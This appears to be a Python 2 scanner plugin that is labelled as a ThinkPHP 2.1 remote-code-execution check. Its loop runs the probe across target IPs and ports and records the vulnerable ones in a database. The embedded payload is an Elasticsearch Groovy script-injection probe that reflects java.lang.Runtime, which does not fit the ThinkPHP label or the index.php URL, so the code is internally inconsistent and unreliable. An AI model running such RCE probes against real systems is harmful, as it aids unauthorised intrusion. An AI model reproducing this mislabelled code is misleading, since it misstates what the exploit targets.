#!/usr/bin/python
#-*- coding:utf-8 -*-

'''
thinkphp2.1 remote exec
'''

import urllib2
import json
from config.settings import HTTP_HEADERS
from Bin.module.base_db import BaseDB
from Plugins.iPluginBase import PluginBase
from common.threadpool import ThreadPool
from common.util import getCurTime
from config.redis_config import WEBAPP_KEY

__all__ = ['TpRemotePlugin']

class TpRemotePlugin(PluginBase):

    name = "TpRemotePlugin"
    version = '1.0'
    description = 'thinkphp 代码执行'


    def __init__(self):
        PluginBase.__init__(self)
        self.threadpool = ThreadPool(num_of_threads= 10 , num_of_work= 10 , daemon = True)
        self.service = 'thinkphp'

    def execute_run(self, ip, port, taskid):
        self.threadpool.add_job(self.__test_tpexec, ip, port)
        self.async_deal_into_db(taskid)


    def __test_tpexec(self, *args, **kwargs):
        '''
        :param url:
        :return:
        '''
        (ip, port) = args[0]
        self.url = 'http://%s:%s/index.php' % (ip, str(port))
        payload = {"size": 1,"script_fields": {"POC": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\")","lang": "groovy"}}}

        try:
            req = urllib2.Request(self.url, headers= HTTP_HEADERS, data = json.dumps(payload))
            resp = urllib2.urlopen(req, timeout = 3)
            json_content = json.loads(resp.read())
            if json_content['hits']['hits'][0]['fields']['POC'][0] == 'class java.lang.Runtime':
                return {'ip' : ip, 'port' : port, 'status' : True}
            else:
                return {'ip' : ip, 'port' : port, 'status' : False}
        except:
             return {'ip' : ip, 'port' : port, 'status' : False}


    def async_deal_into_db(self, taskid):
        '''
        异步入库
        :return:
        '''
        while not self.threadpool.resultQueue.empty():
            try:
                result_dit = self.threadpool.resultQueue.get_nowait()
                print result_dit
                if result_dit['status']:
                    sysvul_dic = {}
                    sysvul_dic['sid'] = taskid
                    sysvul_dic['ip']  = result_dit['ip']
                    sysvul_dic['port'] = result_dit['port']
                    sysvul_dic['service'] = self.service
                    sysvul_dic['first_time'] = getCurTime()
                    self.plugin_db.insert_by_dict(WEBAPP_KEY, sysvul_dic)
            except:
                break

    def wait_for_complete(self, taskid):
        #PluginBase.wait_for_complete(self)
        self.async_deal_into_db(taskid)
        self.db_close()